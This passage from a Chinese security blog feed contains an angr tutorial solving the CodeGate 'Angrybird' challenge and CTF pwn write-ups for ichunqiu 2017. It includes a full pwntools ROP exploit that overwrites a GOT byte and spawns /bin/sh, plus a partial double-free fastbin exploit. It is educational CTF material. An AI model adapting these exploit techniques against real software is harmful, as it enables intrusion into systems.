class="line">e.run()</span><br><span class="line"><span class="keyword">if</span> len(e.found) &gt; <span class="number">0</span>:</span><br><span class="line">  <span class="keyword">print</span> <span class="string">&quot;Found backdoor path:&quot;</span>, e.found[<span class="number">0</span>]</span><br><span class="line"> <span class="keyword">print</span> <span class="string">&quot;Avoided %d paths&quot;</span> % len(e.avoided)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">print</span> e.found[ <span class="number">0</span> ].state.se._solver.result.model</span><br></pre></td></tr></table></figure>Explorerè¿™ä¸ªæ–¹æ³•å¯ä»¥è®¾å®šè¯´è¦æ‰¾åˆ°å“ªä¸ªç¨‹å¼æ‰§è¡Œçš„ä½å€ï¼Œå¯ä»¥ç”¨find=(addr1)æ¥æ‰¾ï¼Œå’Œä½¿ç”¨avoid=(addr2)æ¥é¿å…æ‰¾åˆ°æŸä½å€ã€‚è®¾å®šfind=(addr1)æœ‰ç‚¹åƒæ˜¯åœ¨ä¸‹æ–­ç‚¹ï¼Œä½†æ³¨æ„ä½å€å¿…é¡»æ˜¯åŸºæœ¬åŒºå—ï¼ˆbasic blockï¼‰çš„å¼€å¤´ ï¼Œå¦åˆ™angrå¹¶ä¸ä¼šæ‰¾åˆ°è¯¥ä½å€ï¼Œå¯¼è‡´æœ€åè¯¥è·¯å¾„ä¼šè¢«å½’ç±»æˆdeadendedè€Œä¸æ˜¯foundã€‚<br>å…¶ä¸­seä»£è¡¨æ±‚è§£å™¨solver engineçš„æ„æ€ã€‚</li></ul><h3 id="Path-group"><a href="#Path-group" class="headerlink" title="Path group"></a>Path group</h3><p>æˆ‘æŸ¥é˜…äº†å®˜æ–¹æ–‡æ¡£ç»™çš„å‡ºçš„CTF é¢˜ç›®è§£å†³æ ·ä¾‹ï¼Œå‘ç°åŸºæœ¬éƒ½æ˜¯ä½¿ç”¨Path groupè¿™ä¸ªæ–¹æ³•çš„ã€‚ä»”ç»†å¯¹æ¯”äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªæ–¹æ³•å’Œsurveyorså¾ˆç›¸åƒï¼Œä½†æ˜¯å¤šå‡ºäº†åƒstateç­‰å‚æ•°ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p =  angr.Project(<span class="string">&quot;./examples/Bin&quot;</span>)</span><br><span class="line"></span><br><span class="line">s =  p.factory.blank_state(addr = <span class="number">0x4006ed</span>)</span><br><span class="line">pg = p.factory.Path_group(s,immutable = <span class="literal">False</span>)</span><br><span class="line">path = pg.explore(find  = (<span class="number">0x4006aa</span>,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> path</span><br><span class="line"><span class="keyword">print</span> pg.found[<span class="number">0</span>].state.se._solver.result.model</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„è„šæœ¬ï¼Œå…ˆæ˜¯å®šä¹‰äº†ä¸€ä¸ªå˜æ•°sï¼Œå…¶ä¸­ä¸€ä¸ªblank_stateä»£è¡¨çš„æ˜¯ç©ºç™½çš„çŠ¶æ€ï¼Œèµ·ç‚¹çš„è®¾å®šæ˜¯ä»0x4006edå¼€å§‹ï¼ˆæˆ‘ä»¬é€šè¿‡è¿™æ ·çš„è®¾ç½®ï¼Œè®©ç¨‹åºä»æˆ‘ä»¬æŒ‡å®šçš„ä½ç½®å¼€å§‹ï¼‰è‡³äºå¦‚æœè¦ä»å¤´å¼€å§‹æ‰§è¡Œï¼Œå¯ä»¥ç”¨s = prog.factory.entry_state(args=[â€œ./vulâ€])æ¥æŒ‡å®šåœ¨ç¨‹å¼è¿›å…¥ç‚¹æ—¶çš„çŠ¶æ€ã€‚</p><p>ç´§æ¥ç€çš„å°±æ˜¯path_groupï¼Œåˆšåˆšçš„çŠ¶æ€æ”¾è¿›å»å½“å‚æ•°å³å¯ï¼Œæ¥ä¸‹æ¥åˆ™å’Œsurveyorsç›¸åŒã€‚</p><h1 id="CodeGateCTF-Angrybird"><a href="#CodeGateCTF-Angrybird" class="headerlink" title="CodeGateCTF - Angrybird"></a>CodeGateCTF - Angrybird</h1><p>ä¸Šé¢çš„å†…å®¹ï¼Œéƒ½æ˜¯åŸºæœ¬è®¾è®¡åˆ°äº†angrçš„ä½¿ç”¨ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨ä¸€ä¸ªåˆšç»“æŸæ²¡å¤šä¹…çš„æ¯”èµ›CodeGateCTFçš„ä¸€ä¸ªé¢˜ç›®ä½œä¸ºdemoï¼Œæˆ‘ä»¬å°è¯•è‡ªå·±åˆ†æå¹¶ä¸”ç¼–å†™ä¸€ä¸‹è„šæœ¬ã€‚é¢˜ç›®è¿æ¥åœ¨æ–‡ç« æœ€åä¼šæä¾›ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/angr-study-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/angr-study-01.jpg"></a></p><p>0 0 å½“æˆ‘çœ‹åˆ°è¿™ä¸ªä¸œè¥¿çš„æ—¶å€™ï¼Œæˆ‘æ˜¯å¾ˆæƒ³éª‚äººçš„ã€‚æˆ‘æ€»ä¸èƒ½ä¸€ä¸ªä¸€ä¸ªå»patchè¿™äº›è¯¥æ­»çš„ä¸œè¥¿å§ã€‚<br>æˆ‘ä»¬æœ€ç»ˆçš„ç»“æœï¼Œè‚¯å®šæ˜¯è¦å¾—åˆ°flagï¼Œå¾—åˆ°flagï¼Œæˆ‘ä»¬è‚¯å®šå¾—è°ƒç”¨print æˆ–è€…putè¿™æ ·çš„å‡½æ•°ï¼Œé‚£ä¹ˆé€šè¿‡é™æ€åˆ†æï¼Œæˆ‘ä»¬å¾ˆå¯ä»¥å¾ˆå®¹æ˜“æ‰¾åˆ°ç›®æ ‡åœ°å€ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/angr-study-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/angr-study-02.png"></a></p><p>è¿™é‡Œï¼Œç›®æ ‡åœ°å€å°±æ˜¯0000000000404FC1ã€‚<br>é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•é¿å…é‚£äº›è¯¥æ­»çš„ä¸œè¥¿å‘¢ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥è®¾ç½®aovidå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸€ä¸ªç®€å•çš„å…¥å£ã€‚æˆ–è€…ï¼Œæˆ‘ä»¬å¹²è„†ä¸€ç‚¹ï¼ŒæŠŠä¸€äº›æ— ç”¨çš„ä¸œè¥¿nopæ‰ã€‚è¿™é‡Œï¼Œæˆ‘é€‰æ‹©é€‰æ‹©è®¾ç½®å…¥å£</p><h2 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4007DA</span></span><br><span class="line">find = <span class="number">0x404FBC</span></span><br><span class="line">avoid = [<span class="number">0x400590</span>]</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&#x27;./angrybird2&#x27;</span>)</span><br><span class="line">init = p.factory.blank_state(addr=main)</span><br><span class="line">pg = p.factory.path_group(init, threads=<span class="number">8</span>)</span><br><span class="line">ex = pg.explore(find=find, avoid=avoid)</span><br><span class="line"></span><br><span class="line">final = ex.found[<span class="number">0</span>].state</span><br><span class="line">flag = final.posix.dumps(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Flag: &#123;0&#125;&quot;</span>.format(final.posix.dumps(<span class="number">1</span>)))</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒæ–‡æ¡£ä»¥åŠé“¾æ¥"><a href="#å‚è€ƒæ–‡æ¡£ä»¥åŠé“¾æ¥" class="headerlink" title="å‚è€ƒæ–‡æ¡£ä»¥åŠé“¾æ¥"></a>å‚è€ƒæ–‡æ¡£ä»¥åŠé“¾æ¥</h1><p>angr å®˜æ–¹æ–‡æ¡£ <a href="https://docs.angr.io/docs">doc</a><br>angrè„šæœ¬ç¼–å†™å‚è€ƒ <a href="http://ysc21.github.io/">Yscâ€™blog</a><br>CodeGateCTF - Angrybird <a href="https://github.com/ctfs/write-ups-2017/tree/master/codegate-prequals-2017/re/angrybird-500">Angrybird</a></p><p>#ã€€ä»¥åŠæœ€å<br>è™½ç„¶angrå¾ˆå¥½ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿä¸èƒ½æ‰§ç€ç”¨å·¥å…·ï¼Œæ–¹æ³•è¿˜æ˜¯è¦å­¦ä¹ çš„ï¼Œæ¯”å¦‚ï¼Œæˆ‘å¸ˆå‚…è®©æˆ‘å¥½å¥½å­¦ä¹ ä¸€ä¸‹angrçš„ä»£ç ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> angry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i æ˜¥ç§‹-CTF-Pwn-2017-2</title>
      <link href="ichunqiu-CTF-Pwn-2017-2.html"/>
      <url>ichunqiu-CTF-Pwn-2017-2.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>ç®€å•åˆ†æä¸‹è¿™å‡ ä¸ªé¢˜ç›®ï¼Œå…·ä½“è°ƒè¯•æˆ‘å°±ä¸å†æˆªå›¾äº†</p><h1 id="black-hole"><a href="#black-hole" class="headerlink" title="black hole"></a>black hole</h1><p>è¿™ä¸ªé¢˜ç›®æ˜¯Pxxå¸ˆå‚…å‡ºçš„ï¼Œè€ƒç‚¹å¤§æ¦‚æ˜¯åœ¨æ²¡æœ‰leakï¼Œåˆæ²¡æœ‰libcçš„æƒ…å†µä¸‹å¦‚ä½•å»getshellå§ã€‚</p><h2 id="æˆ‘ä»¬çœ‹çœ‹IDAæ‰¾åˆ°çš„åœ°æ–¹ã€‚"><a href="#æˆ‘ä»¬çœ‹çœ‹IDAæ‰¾åˆ°çš„åœ°æ–¹ã€‚" class="headerlink" title="æˆ‘ä»¬çœ‹çœ‹IDAæ‰¾åˆ°çš„åœ°æ–¹ã€‚"></a>æˆ‘ä»¬çœ‹çœ‹IDAæ‰¾åˆ°çš„åœ°æ–¹ã€‚</h2><p>æˆ‘ä»¬å…ˆè¿›ä¸»å‡½æ•°</p><figure class="highlight as"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  alarm(<span class="number">0x60</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( check() == <span class="number">2333</span> )</span><br><span class="line">    overflowme();</span><br><span class="line">  exit_(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿›å…¥æ¼æ´å‡½æ•°ï¼Œæˆ‘ä»¬åŸºæœ¬å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„æ ˆæº¢å‡ºã€‚</p><figure class="highlight as"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">size_t sub_4006CC()</span><br><span class="line">&#123;</span><br><span class="line">  char ptr; <span class="comment">// [sp+0h] [bp-10h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fread(&amp;ptr, <span class="number">1</span>uLL, <span class="number">0x20</span>uLL, stdin);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶æˆ‘ä»¬å·²ç»æ‰¾åˆ°æ¼æ´çš„åœ°æ–¹ï¼Œç°åœ¨å°±æ˜¯è€ƒè™‘å¦‚ä½•å»åˆ©ç”¨ä»–ï¼Œç„¶åå¦‚ä½•ç¼–å†™expçš„äº‹æƒ…äº†ã€‚é—®é¢˜ï¼Œè¿™ä¸ªé¢˜ç›®æ˜¯æ²¡æœ‰leakçš„ï¼Œäºæ˜¯æˆ‘å’Œmuheä¸€èµ·æ‰åˆ°äº†ä¸€ä¸ªå‘é‡Œ-&gt;ret2dlresolve</p><p>æ­£ç¡®çš„åšæ³•åº”è¯¥æ˜¯:<br>ä¸æ–­retåˆ°mainå‡½æ•°ï¼Œå¾ªç¯è¯»å–è¾“å…¥ï¼Œå†™å®Œpayloadä¹‹åï¼Œretåˆ°retè¿™ä¸ªgadgetsï¼Œå»æ‰§è¡ŒROPã€‚<br>å› ä¸ºæ˜¯åŠ¨æ€é“¾æ¥x64çš„ç¨‹åºï¼Œæ‰€ä»¥ROPæ„é€ ç›´æ¥ä½¿ç”¨é€šå‹gadgetså»æ„é€ ã€‚è¦†ç›–alarm@gotæœ€åä¸€å­—èŠ‚ï¼Œçˆ†ç ´çš„æ‰‹æ®µï¼Œæ‰¾åˆ°syscallâ€¦ç„¶åå°±æ˜¯å¸ƒç½®å¥½å¯„å­˜å™¨ï¼Œèµ·shelläº†ã€‚</p><blockquote><p>å¦‚æœå¯¹é€šç”¨å‹gadgetsæœ‰é—®é¢˜ï¼Œå¯ä»¥å»çœ‹çœ‹è’¸ç±³çš„æ–‡ç« ã€‚è¿‡æ®µæ—¶é—´ï¼Œæˆ‘å¤ä¹ çš„æ—¶å€™åº”è¯¥ä¹Ÿä¼šå†™ä¸ªæ–‡ç« çš„ã€‚</p></blockquote><h3 id="æœ€åexp"><a href="#æœ€åexp" class="headerlink" title="æœ€åexp"></a>æœ€åexp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">&#x27;black_hole&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,10001)</span></span><br><span class="line">    p = remote(<span class="string">&quot;106.75.66.195&quot;</span>,<span class="number">11003</span>)</span><br><span class="line">main_addr = <span class="number">0x0000000000400704</span></span><br><span class="line">token = <span class="number">2333</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_stack</span>(<span class="params">data</span>):</span></span><br><span class="line">    p.sendline(str(token))</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    payload = data.rjust(<span class="number">0x18</span>,<span class="string">&#x27;A&#x27;</span>) + p64(main_addr)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">gadget_1 = <span class="number">0x00000000004007A6</span></span><br><span class="line">gadget_2 = <span class="number">0x0000000000400790</span></span><br><span class="line"> </span><br><span class="line">addr_got_read = <span class="number">0x0000000000601028</span></span><br><span class="line">addr_bss = <span class="number">0x000000000601058</span></span><br><span class="line">addr_got_alarm = <span class="number">0x0000000000601020</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">com_gadget</span>(<span class="params">part1, part2, jmp2, arg1 = <span class="number">0x0</span>, arg2 = <span class="number">0x0</span>, arg3 = <span class="number">0x0</span>,Flag=True</span>):</span></span><br><span class="line">    <span class="keyword">if</span> Flag:</span><br><span class="line">        pl = p64(part1)   <span class="comment"># part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</span></span><br><span class="line">        pl += p64(<span class="number">0</span>)       <span class="comment"># for junk</span></span><br><span class="line">        pl += p64(<span class="number">0x0</span>)     <span class="comment"># rbx be 0x0</span></span><br><span class="line">        pl += p64(<span class="number">0x1</span>)     <span class="comment"># rbp be 0x1</span></span><br><span class="line">        pl += p64(jmp2)    <span class="comment"># r12 jump to</span></span><br><span class="line">        pl += p64(arg3)    <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">        pl += p64(arg2)    <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">        pl += p64(arg1)    <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">        pl += p64(part2)   <span class="comment"># part2 entry will call [rbx + r12 + 0x8]</span></span><br><span class="line">        <span class="keyword">return</span> pl</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pl     = p64(<span class="number">0</span>)       <span class="comment"># for junk</span></span><br><span class="line">        pl += p64(<span class="number">0x0</span>)     <span class="comment"># rbx be 0x0</span></span><br><span class="line">        pl += p64(<span class="number">0x1</span>)     <span class="comment"># rbp be 0x1</span></span><br><span class="line">        pl += p64(jmp2)    <span class="comment"># r12 jump to</span></span><br><span class="line">        pl += p64(arg3)    <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">        pl += p64(arg2)    <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">        pl += p64(arg1)    <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">        pl += p64(part2)   <span class="comment"># part2 entry will call [rbx + r12 + 0x8]</span></span><br><span class="line">        <span class="keyword">return</span> pl</span><br><span class="line">payload =  com_gadget(gadget_1,gadget_2,addr_got_read,arg1=<span class="number">0x0</span>,arg2=addr_got_alarm,arg3=<span class="number">1</span>)</span><br><span class="line">payload += com_gadget(gadget_1,gadget_2,addr_got_read,arg1=<span class="number">0x0</span>,arg2=addr_bss,arg3=<span class="number">0x3B</span>,Flag=<span class="literal">False</span>)</span><br><span class="line">payload += com_gadget(gadget_1,gadget_2,addr_bss+<span class="number">8</span>,arg1=addr_bss,arg2=<span class="number">0x0</span>,arg3=<span class="number">0x0</span>,Flag=<span class="literal">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">print</span> payload</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(payload), <span class="number">0</span>, <span class="number">-8</span>):</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">        write_stack(payload[i<span class="number">-8</span>:i])</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    raw_input(<span class="string">&#x27;0x00000000004006F5 &#x27;</span>)</span><br><span class="line">    p.sendline(str(token))</span><br><span class="line">    p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x18</span> + p64(<span class="number">0x00000000004006CB</span>))</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    off = <span class="number">5</span></span><br><span class="line">    p.send(str(off))  <span class="comment"># ovwer write one byte</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    payload2 = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">    payload2 += p64(<span class="number">0x0000000000400540</span>)</span><br><span class="line">    payload2 += (<span class="number">0x3B</span> - len(payload2) - <span class="number">1</span>) * <span class="string">&quot;A&quot;</span></span><br><span class="line">    p.sendline(payload2)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="fast-fast-fast"><a href="#fast-fast-fast" class="headerlink" title="fast fast fast"></a>fast fast fast</h2><p>ä¸€ä¸ªå¤šé‡é‡Šæ”¾çš„é¢˜ç›®ï¼Œæˆ‘æƒ³è¿™ä¸ªé¢˜ç›®ï¼Œç”¨æ¥åšdemoï¼Œå†™ä¸ªdouble freeçš„åˆ†æã€‚<br>fastbinçš„åˆ©ç”¨ï¼Œç›®æ ‡å°±æ˜¯æ§åˆ¶fdæŒ‡é’ˆï¼Œç„¶ååˆ†é…åˆ°è‡ªå·±æƒ³è¦çš„åœ°å€ï¼Œæ­£å¥½å…¨å±€æŒ‡é’ˆéƒ½åœ¨.bssã€‚<br>ç¨‹åºçš„æ¼æ´æ˜¯double freeã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">delet</span><span class="params">(__int64 ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@1</span></span><br><span class="line">  <span class="built_in">free</span>(*(_QWORD *)(ptr + <span class="number">16</span>));</span><br><span class="line">  result = ptr;</span><br><span class="line">  *(_QWORD *)ptr = <span class="number">0L</span>L;                         <span class="comment">// set flag 0</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¿‡ç¨‹ï¼š</p><pre><code>åˆ†é…ä¸€ä¸ªfastbinï¼Œç„¶åé‡Šæ”¾æ‰åˆ†é…ä¸€ä¸ªsmallbinï¼Œç„¶åé‡Šæ”¾fastbin(å…¶å®è¿™é‡Œé‡Šæ”¾çš„æ˜¯smallbin)å†æ¬¡åˆ†é…åˆšæ‰é‡Šæ”¾æ‰çš„å—(fastbinçš„èœå•é‡Œ)ç¼–è¾‘é‡Šæ”¾å—ï¼Œè¿™é‡Œè¦ä¼ªé€ chunkè°ƒç”¨saysercrt()åˆ†é…fastbinåˆ†é…çš„æƒ³è¦çš„å—(å¾—åˆ°ä¸€ä¸ª.bssä¸Šçš„æŒ‡é’ˆ)ä¹‹ååˆ©ç”¨editåŠŸèƒ½ï¼Œå¯ä»¥å®Œæˆä»»æ„åœ°å€è¯»å†™</code></pre><p>ä¸è¿‡è¦æ³¨æ„çš„æ˜¯ï¼Œå› ä¸ºç¨‹åºæ˜¯é™æ€è¿æ¥çš„ï¼Œæˆ‘ä»¬éœ€è¦å¾—åˆ°ä¸€ä¸ªä»»æ„åœ°å€è¯»ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©è¦†ç›–<br><code>.bss:00000000006C3750 __free_hook     dq ?                    ; DATA XREF: ptmalloc_lock_all+CDr</code><br>ä¸º<br><code>.text:00000000004082A0                 sub     rsp, 0D8h       ; Alternative name is &#39;_IO_printf&#39;</code><br>ç”±äºå¼€äº†NX<br>æˆ‘ä»¬éœ€è¦ï¼ŒROPèµ·shell(syscallé‚£ç§)ï¼Œè¦ä¹ˆmprotectæ”¹å†™å†…å­˜å±æ€§æ‰§è¡Œå†™è¿›å»çš„scã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"><span class="meta">#edit by ysyy@NeSE</span></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">from time <span class="keyword">import</span> sleep</span><br><span class="line">from sys <span class="keyword">import</span> argv</span><br><span class="line">from autorop <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">#s = remote(&#x27;127.0.0.1&#x27;,4545)</span><br><span class="line">s = remote(&#x27;106.75.66.195&#x27;,11001)</span><br><span class="line"><span class="meta">#s = remote(lhost,lport,timeout=1.5)</span></span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function">def <span class="title">fastbin</span><span class="params">()</span>:</span></span><br><span class="line">    s.sendline(&#x27;1&#x27;)</span><br><span class="line">    s.recvuntil(&#x27;3 : delet\n&#x27;)</span><br><span class="line"> </span><br><span class="line"><span class="function">def <span class="title">normalchunk</span><span class="params">()</span>:</span></span><br><span class="line">    s.sendline(&#x27;2&#x27;)</span><br><span class="line">    s.recvuntil(&#x27;3 : del</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p>wp <a href="http://bbs.ichunqiu.com/thread-18979-1-1.html">http://bbs.ichunqiu.com/thread-18979-1-1.html</a><br>muheåšå®¢ <a href="http://o0xmuhe.me/2017/02/16/ichunqiu-CTF-2017-2/">http://o0xmuhe.me/2017/02/16/ichunqiu-CTF-2017-2/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ichunqiu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonæ²™ç®±é€ƒé€¸</title>
      <link href="Python-sandbox-escape.html"/>
      <url>Python-sandbox-escape.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="pythonæ²™ç®±é€ƒé€¸"><a href="#pythonæ²™ç®±é€ƒé€¸" class="headerlink" title="pythonæ²™ç®±é€ƒé€¸"></a>pythonæ²™ç®±é€ƒé€¸</h1><p>æœ¬æ–‡ç”± å®‰å…¨å®¢ ç¿»è¯‘ï¼Œè½¬è½½è¯·æ³¨æ˜â€œè½¬è‡ªå®‰å…¨å®¢â€ï¼Œå¹¶é™„ä¸Šé“¾æ¥ã€‚<a href="http://bobao.360.cn/learning/detail/3542.html">http://bobao.360.cn/learning/detail/3542.html</a><br>åŸæ–‡é“¾æ¥ï¼š<a href="http://blog.isis.poly.edu/ctf/exploitation%20techniques/2012/10/26/escaping-python-sandboxes/">http://blog.isis.poly.edu/ctf/exploitation%20techniques/2012/10/26/escaping-python-sandboxes/</a></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" 